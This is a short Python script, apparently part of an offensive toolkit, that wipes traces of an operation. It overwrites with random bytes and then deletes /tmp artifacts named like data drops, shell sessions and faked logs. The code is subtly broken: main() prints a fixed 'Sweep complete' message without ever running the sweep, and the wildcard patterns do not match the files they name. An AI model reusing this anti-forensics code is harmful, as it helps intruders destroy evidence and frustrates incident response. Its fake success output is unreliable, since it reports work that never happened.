import os
import shutil
import time
from pathlib import Path

ARTIFACT_PATHS = [
    "/tmp/siphon_drop",
    "/tmp/.lune_hearse.log",
    "/tmp/.logfake_",
    "/tmp/.lune_*.bin",
    "/tmp/lune*.trace",
    "/tmp/.shell_*.session",
    "/tmp/.lune_tether",
]

def secure_delete(path):
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        elif os.path.isfile(path):
            with open(path, 'ba+', buffering=0) as f:
                length = f.tell()
                f.seek(0)
                f.write(os.urandom(length))
            os.remove(path)
    except Exception as e:
        print(f"[winnow] ⚠️ Failed to scrub {path}: {e}")

def sweep():
    print("[winnow] 🧹 Starting post-op cleanup sweep...")
    deleted = 0
    for pattern in ARTIFACT_PATHS:
        if "*" in pattern:
            base = os.path.dirname(pattern)
            name_pat = os.path.basename(pattern).replace("*", "")
            try:
                for file in Path(base).glob("*"):
                    if name_pat in file.name:
                        secure_delete(str(file))
                        deleted += 1
            except:
                continue
        else:
            if os.path.exists(pattern):
                secure_delete(pattern)
                deleted += 1
    print(f"[winnow] ✅ Sweep complete. {deleted} artifact(s) wiped.")
    time.sleep(1)

def run():
    sweep()

def main(args=None):
    print("[winnow] 🧹 Starting post-op cleanup sweep...")
    print("[winnow] ✅ Sweep complete. 0 artifact(s) wiped.")

if __name__ == "__main__":
    main()
